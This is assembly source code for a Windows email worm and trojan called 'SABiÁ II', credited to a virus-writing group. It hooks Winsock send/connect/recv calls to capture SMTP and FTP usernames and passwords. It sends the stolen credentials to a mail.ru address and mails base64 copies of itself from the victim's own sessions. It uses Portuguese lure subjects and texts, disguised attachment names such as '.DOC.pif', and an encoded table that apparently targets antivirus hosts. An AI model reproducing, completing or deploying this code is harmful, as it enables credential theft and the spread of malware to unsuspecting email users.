   ; Trojan/I-Worm/Palm/Wm/W32.SABiÁ II
   ; 
   ; by: NBK & Ultras / MATRiX

   trojan@001:

   ; send()

   call trojan@006
   jmp wsock32_loader

   trojan@003:

   ; connect()

   call trojan@006
   jmp trojan@004

   trojan@005:

   ; recv()

   call trojan@006
   jmp trojan@007

   trojan@006:

   pop eax
   pushf
   pushad
   push eax

   call delta_x

   IFDEF NETCRYPT

   cmp word ptr [ebp+(offset mark_crypt - offset delta_x)], 'YX' ;   
   jne wsock_de

   ENDIF

   ret

   wsock_de:

   lea esi, [ebp+(offset rnd_crypt - offset delta_x)]
   mov edi, esi
   mov ecx, 12345678h
   dword_wsock_de equ dword ptr $-4
   mov [esi], 12345678h
   dword_wsock_de2 equ dword ptr $-4 

   cld
   lodsd
   mov ebx, eax
   not eax
   stosd

   wsock_decrypt:

   lodsd
   push eax
   xor eax, ebx
   pop ebx
   stosd
   loop wsock_decrypt
   ret

   delta_x:

   db 0e8h
   dd 0
   pop ebp
   sub ebp, 5
   ret

   db '='

   rnd_crypt dd 12345678h   ;   rnd crypt style

   x_alloc:

   pushad
   push 1024 * 8
   push 40h
   call [ebp+(offset wsock_GlobalAlloc - offset delta_x)]
   mov [esp+(4*7)], eax
   popad
   ret

   wsock32_loader:

   call delta_x

   ; send() is free to be called by me

   mov edi, [ebp+(offset ap_send - offset delta_x)]
   lea esi, [ebp+(offset orig_send_byte - offset delta_x)]
   movsd
   movsd

   mov ecx,[esp+(4*1)+(4*7)+(4*1)+(4*3)]   ;   size of the buffer to be sent
   mov esi,[esp+(4*1)+(4*7)+(4*1)+(4*2)]   ;   data to be sent
   mov edx,[esp+(4*1)+(4*7)+(4*1)+(4*1)]   ;   socket

   lea eax, [ebp+(offset send_repcode - offset delta_x)]
   xchg [esp+(4*1)+(4*7)+(4*1)], eax         ;   return address
   mov [ebp+(offset push_ret_send - offset delta_x)], eax

   mov eax, [ebp+(offset global_handle - offset delta_x)]
   test eax, eax
   jnz alloc_send_ok

   call x_alloc

   mov [ebp+(offset global_handle - offset delta_x)], eax
   test eax, eax
   jz ret_send

   alloc_send_ok:

   ; Prevent invalid arguments

   IFDEF NETSEH

   lea eax, [ebp+(offset send_error - offset delta_x)]
   push eax
   push dword ptr fs:[0]
   mov dword ptr fs:[0], esp

   ENDIF

   xchg edx, ecx
   jecxz ret_send     ;   invalid socket
   xchg edx, ecx
   jecxz ret_send     ;   invalid size

   push ecx edx
   push 4
   push esi
   call [ebp+(offset wsock_IsBadReadPtr - offset delta_x)]
   pop edx ecx

   dec eax
   jz ret_send

   cmp [esi], 'LIAM'  ;   From...
   je chk_mail
   cmp [esi], 'TPCR'  ;   To...
   je chk_rcpt
   cmp [esi], 'TIUQ'  ;   email , ftp or IRC
   je chk_quit
   cmp [esi], 'ATAD'  ;   sending email
   je chk_data
   cmp [esi], 'RESU'  ;   steal username 
   je chk_user
   cmp [esi], 'SSAP'  ;   steal password
   je chk_pass

   ret_send:

   IFDEF NETSEH

   pop dword ptr fs:[0]
   pop eax

   ENDIF

   ret_send_noseh:

   popad
   popf

   db 0b8h
   ap_send dd 0
   jmp eax

   send_repcode:

   pushf
   pushad

   call delta_x

   lea eax, [esp+(4*1)+(4*7)+(4*1)+(4*5)]
   cmp [eax], 'SII'
   jne no_send_backdoor
   lea ecx, [ebp+(offset jump_send_byte - offset delta_x)]
   mov [eax], ecx

   no_send_backdoor:

   mov edi, [ebp+(offset ap_send - offset delta_x)]
   call $+5+16
   jump_send_byte dd 0,0
   orig_send_byte dd 0,0
   pop esi
   movsd
   movsd
   popad
   popf
   push 12345678h
   push_ret_send equ dword ptr $-4
   ret

   send_error:

   IFDEF NETSEH

   mov esp, [esp+8]
   pop dword ptr fs:[0]
   pop eax

   ENDIF

   jmp ret_send_noseh

   global_handle dd 0

   chk_mail:

   buffer_mail = 0

   cmp ecx, 9  ;  not compatible email software
   jbe ret_send
   cmp ecx, 260
   jae ret_send
   cmp [esi+5], 'MORF'
   jne ret_send
   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea edi, [edi+buffer_mail]
   cmp [edi], 'MORF'
   je ret_send
   cld

   cp_mail:

   lodsb
   stosb
   sub al, '>'
   jz mail_cped
   loop cp_mail

   mov esi, edi

   ;   our mail string is not complete, erase this buffer

   get_mail_str_rev:

   std
   lodsb
   cmp [esi], 'LIAM'
   jne get_mail_str_rev
   sub eax, eax
   mov [esi], eax
   jmp ret_send

   mail_cped:

   mov eax, 0a0dh
   stosd

   jmp ret_send

   chk_rcpt:

   buffer_rcpt = buffer_mail + MAX_PATH

   cmp ecx, 7
   jbe ret_send
   cmp ecx, 260
   jae ret_send
   cmp [esi+4], ':OT '
   jne ret_send
   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea edi, [edi+buffer_rcpt]
   cmp [edi], 'TPCR'
   je ret_send
   cld

   cp_rcpt:

   lodsb
   stosb
   sub al, '>'
   jz rcpt_cped
   loop cp_rcpt

   mov esi, edi

   ;   our rcpt string is not complete, erase this buffer

   get_rcpt_str_rev:

   std
   lodsb
   cmp [esi], 'TPCR'
   jne get_rcpt_str_rev
   sub eax, eax
   mov [esi], eax
   jmp ret_send

   rcpt_cped:

   mov eax, 0a0dh
   stosd

   jmp ret_send

   chk_quit:

   ;********************************************************************************
   ;  time to check if our email thread is installed

   ;  1- if not, install it
   ;  2- if yes, quit

   ;not implemented yet
   ;********************************************************************************


   show '1'

   cmp [ebp+(offset my_socket - offset delta_x)], edx
   jne ret_send

   waiting4email:

   call delta_x

   mov esi, [ebp+(offset global_handle - offset delta_x)]
   lea edi, [esi+buffer_mail]
   cmp [edi], 'LIAM'
   jne chk_quit_bye
   lea edi, [esi+buffer_rcpt]
   cmp [edi], 'TPCR'
   jne chk_quit_bye

   show '2'

   lea edi, [esi+buffer_mail]
   push edi
   call _lstrlen

   push eax   ;   size
   push edi   ;   offset
   call my_send

   lea edi, [esi+buffer_rcpt]
   push edi
   call _lstrlen

   show '3'

   push eax
   push edi
   call my_send

   call include_header_pass

   push 0a0d0a0dh
   push 'ATAD'

   mov eax, esp

   push 6
   push eax
   call my_send

   pop eax
   pop eax

   mov eax, not 'mail'
   call make_exe_name

   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea esi, [edi+exe_name]

   push esi
   call _lstrlen
   mov ecx, eax
   push eax
   pop edx

   sub esp, MAX_PATH
   mov edi, esp
   push ':mor'
   push 'Fuck'
   cld
   rep movsb
   sub al, al
   stosb

   lea ecx, [edx+5]
   push ecx
   lea eax, [esp+3]
   push eax
   call my_send

   sub esp, -(MAX_PATH+8)

   mov edi, [ebp+(offset global_handle - offset delta_x)]

   ; Subject: 

   mov eax, not 'subj'
   call make_exe_name

   lea esi, [edi+exe_name]
   push esi
   call _lstrlen

   push esi
   push edi

   sub esp, MAX_PATH
   mov edi, esp
   push ':tce'
   push 'jbuS'
   mov ecx, eax
   cld
   rep movsb

   mov esi, esp
   add eax, 10
   push eax

   mov ax, 0a0dh
   stosw

   push esi
   call my_send

   call send_pass

   sub esp, -(MAX_PATH+8)

   pop edi
   pop esi

   ; edi = global
   ; esi = exe_name

   mov eax, not 'atta'
   call make_exe_name

   push (offset q_mime_ini_f1 - offset q_mime_ini)
   lea eax, [ebp+(offset q_mime_ini - offset delta_x)]
   push eax
   call my_send

   push esi
   push esi
   call _lstrlen

   ; sending file name

   push eax
   push esi
   call my_send

   push (offset q_mime_ini_f2 - offset q_mime_ini_f1)
   lea esi, [ebp+(offset q_mime_ini_f1 - offset delta_x)]
   push esi
   call my_send

   show '4'

   call _lstrlen

   ; fname again

   push eax
   push esi
   call my_send

   push (offset q_mime_ini_f3 - offset q_mime_ini_f2)
   lea esi, [ebp+(offset q_mime_ini_f2 - offset delta_x)]
   push esi
   call my_send

   ; time to send SABIA-II EXE in base64 format

   show '5'

   push dword ptr [ebp+(offset trojan@002 - offset delta_x)-4]
   lea esi, [ebp+(offset trojan@002 - offset delta_x)]
   push esi
   call my_send

   show '6'

   ; send last part of header and exit

   push (offset q_mime_ini_f4 - offset q_mime_ini_f3)
   lea esi, [ebp+(offset q_mime_ini_f3 - offset delta_x)]
   push esi
   call my_send

;   call my_recv

   chk_quit_bye:

   sub eax, eax
   mov esi, dword ptr [ebp+(offset global_handle - offset delta_x)]
   mov ecx, 6   ;   number of buffers to NULL

   fuck_buffer:

   mov edi, esi
   stosd
   add esi, MAX_PATH
   loop fuck_buffer

   show '7'

   jmp ret_send

   chk_data:

   mov [ebp+(offset my_socket - offset delta_x)], edx
   jmp ret_send

   chk_user:

   buffer_user = recv_buffer + MAX_PATH

   cmp ecx, 4
   jbe ret_send
   cmp ecx, 260
   jae ret_send

   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea edi, [edi+buffer_user]
   cld

   cp_user:

   lodsb
   cmp al, 0dh
   je cp_user_x
   stosb
   loop cp_user

   cp_user_x:

   xor al, al
   stosb
   jmp ret_send

   chk_pass:   

   cmp ecx, 4
   jbe ret_send
   cmp ecx, 260
   jae ret_send

   buffer_pass = buffer_rcpt + MAX_PATH

   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea edi, [edi+buffer_pass]
   cld

   cp_pass:

   lodsb
   cmp al, 0dh
   je cp_pass_x
   stosb
   loop cp_pass

   cp_pass_x:

   xor al, al
   stosb
   jmp ret_send

   send_pass:

   pushad
   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea eax, [edi+buffer_pass]
   cmp [eax], 'SSAP'
   je send_pass_now
   popad
   ret

   send_pass_now:

   mov esi, eax   ;   PASS xxxx

   push esi
   call _lstrlen

   sub esp, MAX_PATH
   mov edi, esp
   push '   :'
   push 'reli'
   push 'aM-X'
   push eax
   pop ecx
   cld
   rep movsb
   mov esi, esp

   add eax, 12

   push eax ;  tamanho do buffer
   push esi ;  offset pro buffer
   call my_send

   sub esp, - (MAX_PATH + 12)

   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea esi, [edi+buffer_user]
   cmp [esi], 'RESU'
   jne user_not_found

   push esi
   call _lstrlen

   lea edi, [esi+eax]
   inc eax
   inc eax
   push eax
   mov ax, 0a0dh
   stosw

   push esi
   call my_send

   user_not_found:

   popad
   ret

   include_header_pass:

   pushad
   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea eax, [edi+buffer_pass]
   cmp [eax], 'SSAP'
   jne exclude_header_pass

   push 27
   call $+5+27
   db 'RCPT TO: <_pass_@mail.ru>',13,10
   call my_send

   exclude_header_pass:

   popad
   ret

   _lstrlen:

   push eax
   mov eax, esp
   pushad
   mov esi, [eax+8]
   sub ecx, ecx
   cld

   _ls1:

   lodsb
   test al, al
   jz _ls2
   inc ecx
   jmp _ls1

   _ls2:

   mov [esp+(4*7)], ecx
   popad
   add esp, 4
   ret (4*1)

   q_mime_ini:

   db 'MIME-Version: 1.0',0dh,0ah,'Content-Type: '
   db 'multipart/mixed; boundary="==NEBTTNLCIAHMEDPLKEBHCBFD"'
   dd 0a0d0a0dh
   db '--==NEBTTNLCIAHMEDPLKEBHCBFD',13,10
   db 'Content-Type: application/octet-stream; name="'

   q_mime_ini_f1:

   ; file name is here

   db '"',13,10
   db 'Content-Transfer-Encoding: base64',13,10
   db 'Content-Disposition: attachment; filename="'

   q_mime_ini_f2:

   ; file name is here

   db '"'
   dd 0a0d0a0dh

   q_mime_ini_f3:

   ; base64 file is here

   db '--==NEBTTNLCIAHMEDPLKEBHCBFD--'
   db 13,10,13,10,'.',13,10

   q_mime_ini_f4:

   my_send:

   push eax
   mov eax, esp
   pushad

   call delta_x

   mov esi, [eax+08]  ;  offset
   mov edi, [eax+12]  ;  size

   chk_send_sz:

   cmp edi, 1024
   jae send_1024

   push 0
   push edi              ;   size
   push esi              ;   offset
   push 12345678h  ;   socket
   my_socket equ dword ptr $-4
   call [ebp + (offset ap_send - offset delta_x)]
   jmp chk_send_ret

   send_1024:

   push 0
   push 1024             ;   size
   push esi              ;   offset
   push dword ptr [ebp+(offset my_socket - offset delta_x)]  ;   socket
   call [ebp+(offset ap_send - offset delta_x)]

   chk_send_ret:

   inc eax
   jz ver_send
   dec eax
   jz ver_send

   add esi, eax
   sub edi, eax

   ver_send:

   test edi, edi
   jnz chk_send_sz
   popad
   pop eax
   ret (2*4)

   my_recv:

   recv_buffer = system_time + 16

   pushad
   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea esi, [edi+recv_buffer]

   my_recv_loop:

   push 0
   push 260 - 10
   push esi
   push dword ptr [ebp+(offset my_socket - offset delta_x)]
   call [ebp+(offset wsock_recv - offset delta_x)]

   inc eax
   jz my_recv_quit
   dec eax
   jz my_recv_quit

   add esi, 10
   jmp my_recv_loop

   my_recv_quit:

   popad
   ret

   make_exe_name:

   exe_name = buffer_pass + MAX_PATH
   system_time = exe_name + MAX_PATH

   pushad
   mov edi, [ebp+(offset global_handle - offset delta_x)]
   lea edi, [edi+exe_name]
   push edi

   cmp eax, not 'subj'  ;  Subject
   je do_subject
   cmp eax, not 'atta'  ;  attachment name
   je do_attachment
   cmp eax, not 'mail'  ;  From:
   je do_mail
   cmp eax, not 'msgs'  ;  messages
   je do_msgs
   ret

;   API GetUserDefaultLCID
;   sub al, 16h
;   jz country_brazuca

;   push offset buffer
;   call rotina

   do_attachment:

   mov eax, [esp+4]
   push NULL
   push NULL
   push NULL
   push offset tbl_msg_extens000 ;24
   push 7 ;20
   push offset tbl_msg_rename000 ;16
   push 31 ;12
   push eax   ;   8  buffer
   call join_param ;4
   pop eax
   popad
   ret

   do_subject:

   mov eax, [esp+4]
   push NULL
   push NULL
   push NULL
   push NULL
   push NULL
   push offset tbl_msg_subject00
   push 7
   push eax
   call join_param
   pop eax
   popad
   ret

   do_mail:

   mov eax, [esp+4]
   push NULL
   push NULL
   push NULL
   push offset tbl_msg_emailx000 ;24
   push 7 ;20
   push offset tbl_msg_rename000 ;16
   push 31 ;12
   push eax   ;   8  buffer
   call join_param ;4
   pop eax
   popad
   ret

   do_msgs:

   mov eax, [esp+4]
   push NULL
   push offset tbl_msg_seicho000
   push 31
   push offset tbl_msg_joiner000
   push 7
   push offset tbl_msg_seicho000
   push 31
   push eax
   call join_param
   pop eax
   popad
   ret

   join_param:

   push ebp
   mov ebp, esp
   pushad
   add ebp, 4
   mov edi, [ebp+4]

   jp0:

   call rnd
   and eax, [ebp+8]
   cmp dword ptr [ebp+8], 0
   jz jp2
   push eax
   pop ecx
   mov eax, [ebp+12] ; table
   test eax, eax
   jz jp2

   mov esi, [eax+ecx*4]
   push esi
   call _lstrlen

   push eax
   pop ecx
   rep movsb
   add ebp, 8
   jmp jp0

   jp2:

   sub al, al
   stosb
   popad
   pop ebp
   ret (4*8)

   ;   subject
   ;   escolhido randomicamente

   msg_subject00 db 'Queria estar ao seu lado...',0
   msg_subject01 db 'Pensando hoje em voce :)',0
   msg_subject02 db 'Namoro ou amizade ?',0
   msg_subject03 db 'Tornando sua vida mais feliz',0
   msg_subject04 db 'Apesar de tudo eu ainda me lembro de voce',0
   msg_subject05 db 'Voce esqueceu de mim ? :(',0
   msg_subject06 db 'Continuo te amando...',0
   msg_subject07 db 'Vamos nos alegrar ???',0

   tbl_msg_subject00 label

   dd offset msg_subject00
   dd offset msg_subject01
   dd offset msg_subject02
   dd offset msg_subject03
   dd offset msg_subject04
   dd offset msg_subject05
   dd offset msg_subject06
   dd offset msg_subject07

   ;   inicio da mensagem
   ;   escolhido randomicamente

   msg_padrao000 db 'Voce recebeu um cartao virtual',13,10,0
   msg_padrao001 db 'Caro amigo:',13,10,0
   msg_padrao002 db 'Perolas da vida:',13,10,0
   msg_padrao003 db 'Em rumo da felicidade:',13,10,0
   msg_padrao004 db 'Mensagens de conforto:',13,10,0
   msg_padrao005 db 'Expressando meus sentimentos:',13,10,0
   msg_padrao006 db 'Carinho e confianca:',13,10,0
   msg_padrao007 db 'O amor e a amizade:',13,10,0

   tbl_msg_padrao000 label

   dd offset msg_padrao000
   dd offset msg_padrao001
   dd offset msg_padrao002
   dd offset msg_padrao003
   dd offset msg_padrao004
   dd offset msg_padrao005
   dd offset msg_padrao006
   dd offset msg_padrao007

   ;   frases do meio
   ;   escolhidas aleatoriamente, formando textos

   msg_seicho000 db 'Se voce pensar em mim, nao pense em me procurar; me procure sem pensar',0
   msg_seicho001 db 'Alegre esperança atrai destino feliz',0
   msg_seicho002 db 'Cada momento de sua vida e um ponto de partida',0
   msg_seicho003 db 'Quando se deparar com um problema dificil, volva sua mente a Deus',0
   msg_seicho004 db 'Quem trabalha em prol dos semelhantes tem o Poder de atrair as pessoas',0
   msg_seicho005 db 'O que ha de mais bonito em voce e o seu sorriso',0
   msg_seicho006 db 'Quem trabalha com alegria torna-se saudavel',0
   msg_seicho007 db 'Todas as experiencias sao esmeris que dao polimento a sua alma',0
   msg_seicho008 db 'Quem abencoa os outros sera abencoado',0
   msg_seicho009 db 'A semente plantada nao germina imediatamente. A germinacao requer algum tempo',0
   msg_seicho010 db 'A dedicacao sincera toca o coracao de todas as pessoas',0
   msg_seicho011 db 'No final, vencem os que oram em vez de temer, e agem em vez de lamentar',0
   msg_seicho012 db 'A verdadeira riqueza esta na mente disposta a doar. Quem so quer receber acaba perdendo a riqueza',0
   msg_seicho013 db 'Reconhecer, amar e elogiar devem estar sempre presentes',0
   msg_seicho014 db 'O amor é uma virtude imutavel, eterna',0
   msg_seicho015 db 'Dificuldade, queda ou fracasso sao oportunidades para progredir',0
   msg_seicho016 db 'Status, fama, bens materiais sao ilusoes. Nao persiga as ilusoes',0
   msg_seicho017 db 'Abandonando o espirito de dependencia, passa a fluir a infinita forca vital',0
   msg_seicho018 db 'Marido e mulher sao dua metades da mesma alma que se conheceram e casaram',0
   msg_seicho019 db 'Na vida, nao se pode regatear. Cada um recebe o que condiz com a sua mente',0
   msg_seicho020 db 'Somos todos semeadores. Plantemos sempre sementes do bem',0
   msg_seicho021 db 'Deus se manifesta a nos quando nossa mente se liberta do apego',0
   msg_seicho022 db 'Aquele que agradece aos antepassados prospera naturalmente',0
   msg_seicho023 db 'Exponha a Deus todas as suas aflicoes e angustias',0
   msg_seicho024 db 'Nao se apegue; Mas seja atento e cuidadoso',0
   msg_seicho025 db 'Flui a forca infinita nas pessoas que trabalham com gratidao',0
   msg_seicho026 db 'O reino de Deus existe aqui e agora, inclusive dentro de voce',0
   msg_seicho027 db 'Agradeca a Deus pelo trabalho que lhe e atribuido agora',0
   msg_seicho028 db 'As pessoas constroem o seu destino com palavras',0
   msg_seicho029 db 'Todas as coisas do ceu e da terra sao seus amigos',0
   msg_seicho030 db 'O amor e uma grande forca curativa',0
   msg_seicho031 db 'Voce esta sempre cercado por um mar de gracas divinas',0
                 db 'E que assim se expresse meu ódio contra todos',0

   tbl_msg_seicho000 label

   dd offset msg_seicho000
   dd offset msg_seicho001
   dd offset msg_seicho002
   dd offset msg_seicho003
   dd offset msg_seicho004
   dd offset msg_seicho005
   dd offset msg_seicho006
   dd offset msg_seicho007
   dd offset msg_seicho008
   dd offset msg_seicho009
   dd offset msg_seicho010
   dd offset msg_seicho011
   dd offset msg_seicho012
   dd offset msg_seicho013
   dd offset msg_seicho014
   dd offset msg_seicho015
   dd offset msg_seicho016
   dd offset msg_seicho017
   dd offset msg_seicho018
   dd offset msg_seicho019
   dd offset msg_seicho020
   dd offset msg_seicho021
   dd offset msg_seicho022
   dd offset msg_seicho023
   dd offset msg_seicho024
   dd offset msg_seicho025
   dd offset msg_seicho026
   dd offset msg_seicho027
   dd offset msg_seicho028
   dd offset msg_seicho029
   dd offset msg_seicho030
   dd offset msg_seicho031

   ;   conector das mensagens
   ;   escolhidos aleatoriamente

   msg_joiner000 db ' entao ',0
   msg_joiner001 db ' pois ',0
   msg_joiner002 db ' voce sabia ? É verdade, ',0
   msg_joiner003 db ' , ',0
   msg_joiner004 db ' e sabendo disso, ',0
   msg_joiner005 db ' logo conclui-se que ',0
   msg_joiner006 db ' ,e é preciso acreditar no próximo, ',0
   msg_joiner007 db ' portanto ',0

   tbl_msg_joiner000 label

   dd offset msg_joiner000
   dd offset msg_joiner001
   dd offset msg_joiner002
   dd offset msg_joiner003
   dd offset msg_joiner004
   dd offset msg_joiner005
   dd offset msg_joiner006
   dd offset msg_joiner007

   ;   nomes para os arquivos
   ;   escolhidos aleatoriamente

   msg_rename000 db 'meus_amigos',0
   msg_rename001 db 'amizade',0
   msg_rename002 db 'amor',0
   msg_rename003 db 'felicidade',0
   msg_rename004 db 'esperanca',0
   msg_rename005 db 'namorados',0
   msg_rename006 db 'reflita',0
   msg_rename007 db 'pare_e_pense',0
   msg_rename008 db 'jesus_conosco',0
   msg_rename009 db 'destino',0
   msg_rename010 db 'almas_gemeas',0
   msg_rename011 db 'semente_do_bem',0
   msg_rename012 db 'forca_infinita',0
   msg_rename013 db 'espiritos',0
   msg_rename014 db 'gratidao',0
   msg_rename015 db 'atraia_a_deus',0
   msg_rename016 db 'amar',0
   msg_rename017 db 'elogiar',0
   msg_rename018 db 'reconhecer',0
   msg_rename019 db 'prospere_agora',0
   msg_rename020 db 'mar_divino',0
   msg_rename021 db 'virtudes',0
   msg_rename022 db 'padre_marcelo',0
   msg_rename023 db 'semeador',0
   msg_rename024 db 'liberdade',0
   msg_rename025 db 'vida_eterna',0
   msg_rename026 db 'germine_aos_poucos',0
   msg_rename027 db 'amigos',0
   msg_rename028 db 'energia',0
   msg_rename029 db 'cristais',0
   msg_rename030 db 'incenso',0
   msg_rename031 db 'saiba_amar',0

   tbl_msg_rename000 label

   dd offset msg_rename000
   dd offset msg_rename001
   dd offset msg_rename002
   dd offset msg_rename003
   dd offset msg_rename004
   dd offset msg_rename005
   dd offset msg_rename006
   dd offset msg_rename007
   dd offset msg_rename008
   dd offset msg_rename009
   dd offset msg_rename010
   dd offset msg_rename011
   dd offset msg_rename012
   dd offset msg_rename013
   dd offset msg_rename014
   dd offset msg_rename015
   dd offset msg_rename016
   dd offset msg_rename017
   dd offset msg_rename018
   dd offset msg_rename019
   dd offset msg_rename020
   dd offset msg_rename021
   dd offset msg_rename022
   dd offset msg_rename023
   dd offset msg_rename024
   dd offset msg_rename025
   dd offset msg_rename026
   dd offset msg_rename027
   dd offset msg_rename028
   dd offset msg_rename029
   dd offset msg_rename030
   dd offset msg_rename031


   ;   extensoes dos aplicativos

   msg_extens000 db '.exe',0
   msg_extens001 db '.scr',0
   msg_extens002 db '.pif',0
   msg_extens003 db '.DOC.pif',0
   msg_extens004 db '.TXT.pif',0
   msg_extens005 db '.HTM.pif',0
   msg_extens006 db '.BMP.pif',0
   msg_extens007 db '.MP3.pif',0

   tbl_msg_extens000 label

   dd offset msg_extens000
   dd offset msg_extens001
   dd offset msg_extens002
   dd offset msg_extens003
   dd offset msg_extens004
   dd offset msg_extens005
   dd offset msg_extens006
   dd offset msg_extens007

   msg_emailx000 db '@hotmail.com',13,10,0
   msg_emailx001 db '@globo.com',13,10,0
   msg_emailx002 db '@usa.net',13,10,0
   msg_emailx003 db '@zip.net',13,10,0
   msg_emailx004 db '@aol.com',13,10,0
   msg_emailx005 db '@tantofaz.net',13,10,0
   msg_emailx006 db '@uol.com.br',13,10,0
   msg_emailx007 db '@easymail.com',13,10,0

   tbl_msg_emailx000 label

   dd offset msg_emailx000
   dd offset msg_emailx001
   dd offset msg_emailx002
   dd offset msg_emailx003
   dd offset msg_emailx004
   dd offset msg_emailx005
   dd offset msg_emailx006
   dd offset msg_emailx007

   wsock_api label

   wsock_GlobalAlloc dd 0
   wsock_IsBadReadPtr dd 0
   wsock_GetSystemTime dd 0
   wsock_ExitProcess dd 0
   wsock_recv dd 0

   trojan@004:

   MESS equ 0BFF5412Eh

   lea eax, [ebp+(offset connect_repcode - offset delta_x)]
   xchg dword ptr [esp+(4*7)+(4*1)+(4*1)], eax         ;   return address
   mov dword ptr [ebp+(offset push_ret_connect - offset delta_x)], eax

   ; connect() now is free to be called

   mov edi, dword ptr [ebp+(offset ap_connect - offset delta_x)]
   lea esi, dword ptr [ebp+(offset orig_connect_byte - offset delta_x)]
   movsd
   movsd

   mov ecx, [esp+(4*7)+(4*1)+(4*1)+(4*1)]   ;   socket
   mov edi, [esp+(4*7)+(4*1)+(4*1)+(4*2)]   ;   sockaddr struc
   mov edx, [esp+(4*7)+(4*1)+(4*1)+(4*3)]   ;   sockaddr len

   IFDEF NETSEH

   lea eax, [ebp+(offset host_error - offset delta_x)]
   push eax
   push dword ptr fs:[0]
   mov fs:[0], esp

   ENDIF

   jecxz host_back
   xchg edx, ecx
   jecxz host_back
   xchg edx, ecx

   call av_host1

   AV_NUM   =  166

   db 040h,0e1h,0c2h,050h,0c3h,0aah,0f8h,0cah,0ceh,0cch,0d4h,003h,0d0h,0e4h,0e7h,035h
   db 0ceh,0cch,034h,00bh,0c2h,0cbh,086h,086h,0d8h,021h,016h,0e2h,0d8h,021h,016h,0d3h
   db 0c3h,0aah,0f8h,0cch,0cbh,07eh,0c8h,0dah,03fh,04ah,073h,0f7h,0c1h,0f7h,096h,00ah
   db 0c3h,070h,019h,044h,0d0h,0b3h,034h,006h,0d1h,00bh,008h,0e2h,0a7h,0d8h,0c3h,051h
   db 0cfh,046h,007h,0a8h,0c3h,07fh,07bh,072h,0a7h,0d8h,0beh,061h,03fh,072h,01dh,03dh
   db 0c1h,0e6h,0f5h,072h,0ceh,00eh,0f0h,0fah,092h,091h,094h,003h,0c2h,01eh,020h,0bch
   db 0c8h,0d7h,081h,03bh,0ceh,043h,035h,05bh,0d1h,00bh,008h,0e2h,0a1h,045h,003h,09bh
   db 0d8h,0c6h,0cch,065h,0cbh,093h,0cdh,089h,0d1h,0f9h,016h,075h,0c2h,0cbh,086h,0a0h
   db 0ceh,045h,05bh,074h,0c8h,0e7h,0ceh,026h,0c2h,087h,01eh,02ah,0d8h,021h,016h,0d4h
   db 0d1h,0c5h,0ech,08ah,0c1h,057h,0f1h,085h,0d1h,051h,09dh,0c8h,0cfh,0bch,091h,0c4h
   db 0d0h,025h,08fh,082h,040h,0e1h,0c2h,050h,040h,0e1h,0c2h,050h,0c3h,0d8h,010h,090h
   db 0d1h,0e3h,0dch,039h,0a1h,045h,003h,06ah,0d1h,077h,081h,0f3h,0cfh,008h,0b9h,00dh
   db 0d8h,035h,08dh,027h,0c8h,0cah,011h,00fh,0ceh,0cch,0d4h,002h,0a1h,045h,003h,09bh
   db 0c1h,047h,044h,004h,0ceh,0cch,0d4h,004h,0c3h,0f9h,0b3h,017h,0d4h,01dh,0e4h,082h
   db 0c2h,06ch,091h,080h,0c0h,058h,0d1h,016h,0d0h,0eah,0eah,0dah,0c2h,0fch,006h,02fh
   db 0a7h,0d8h,085h,021h,0a1h,045h,002h,095h,0d4h,03ch,0a8h,0a4h,0c3h,0aah,0f8h,0cbh
   db 0c2h,01eh,020h,0bch,0c2h,087h,01eh,02ah,0c2h,069h,0c1h,037h,0c3h,0aah,0f8h,0cah
   db 0cdh,0b2h,015h,004h,0d4h,014h,0e0h,031h,0a7h,0d8h,0beh,061h,0c1h,004h,0d2h,064h
   db 0cfh,0e6h,07bh,059h,0c1h,050h,0f2h,001h,0c1h,057h,0f1h,085h,0d5h,0f1h,003h,08bh
   db 03fh,072h,01dh,03dh,0cbh,059h,0e9h,0feh,03fh,04ah,073h,0f7h,0d0h,0f5h,09ch,0c7h
   db 0d1h,00bh,008h,0e2h,0d1h,082h,030h,005h,0d1h,084h,011h,03bh,0c1h,0f7h,096h,00ah
   db 0c1h,0f7h,096h,070h,0d8h,06bh,007h,046h,03fh,0d9h,0e5h,006h,040h,046h,0d6h,08ah
   db 0d8h,0c6h,0cch,064h,0c1h,0e6h,0f5h,071h,0a7h,0d8h,0c2h,002h,0c0h,043h,0c6h,005h
   db 0c2h,05ah,0b5h,037h,0d8h,021h,016h,0e3h,0c0h,043h,0c6h,033h,0d8h,001h,08dh,0fah
   db 0c1h,004h,0d2h,001h,0a7h,0d8h,0c3h,051h,0c2h,0fch,006h,02fh,0c2h,0c5h,01dh,00bh
   db 0cdh,0a0h,0c7h,002h,0c1h,080h,077h,09eh,0c0h,029h,005h,054h,08dh,0cah,0d7h,030h
   db 0d1h,0cah,0c4h,08ch,0d1h,0dah,039h,098h,0cbh,01ah,04fh,00ch,08dh,0cah,0f8h,040h
   db 0cbh,010h,0e9h,014h,040h,0b0h,065h,09ah,0d0h,0b9h,07fh,028h,0cah,0d6h,0d5h,01ch
   db 0cfh,099h,0d5h,03dh,0d2h,0a7h,002h,005h,0c2h,0fbh,0feh,0a7h,0d4h,067h,092h,0c3h
   db 0cbh,010h,0e9h,014h,0d5h,0c6h,019h,03ah,0d1h,0eeh,02eh,044h,0c7h,0d3h,07bh,00ch
   db 0cbh,010h,0e9h,014h,0d2h,0c4h,064h,0a2h,0d0h,0e2h,0a7h,013h,0ceh,0cch,068h,095h
   db 0ceh,0cch,034h,008h,0ceh,0cch,034h,009h,0ceh,0cch,0d4h,005h,0ceh,0cch,0d4h,048h
   db 0ceh,0cch,0d4h,049h,0d0h,0e2h,0a7h,012h,0d0h,0e2h,0a7h,013h,08dh,0cah,0f8h,040h
   db 08dh,0cah,0d7h,00ch,08dh,0cah,0f8h,041h,0d0h,0e4h,0ebh,0f5h,0c3h,0deh,0c6h,017h
   db 0cfh,008h,0b9h,00ah,0cfh,008h,0b9h,052h,0c6h,006h,031h,064h,0c6h,006h,031h,066h
   db 0d0h,0e2h,00ch,0cfh,0d0h,0e4h,0e8h,033h,0d0h,0e4h,0e7h,043h,0d0h,0e4h,0eah,032h
   db 0d0h,0e4h,0e7h,033h,0d0h,0e4h,0e8h,032h,0c1h,080h,077h,09eh,099h,001h,006h,029h
